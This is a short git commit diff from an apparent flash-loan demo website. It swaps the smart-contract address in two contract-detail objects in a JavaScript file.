633e9409460c36fb3061f7481e61ede826fdc802
flashloan-demo <85358791+flashloan-demo@users.noreply.github.com>
2021-06-10 01:12:12 +0530

    Update chain5e1f.js

--- assets/js/chain5e1f.js
+++ assets/js/chain5e1f.js
@@ -1,5 +1,5 @@
 const contractDetails = {
-    address: "0x6609B88FF300bd7FB0Bf47515cbe7e59E39c91a1",
+    address: "0xF10BE42eb18900E6a4D18688C310475E3fdC7694",
     abi: [
       {
         inputs: [
@@ -62,7 +62,7 @@ const contractDetails = {
     ],
   },
   bnbContractDetails = {
-    address: "0x6609B88FF300bd7FB0Bf47515cbe7e59E39c91a1",
+    address: "0xF10BE42eb18900E6a4D18688C310475E3fdC7694",
     abi: [
       {
         inputs: [
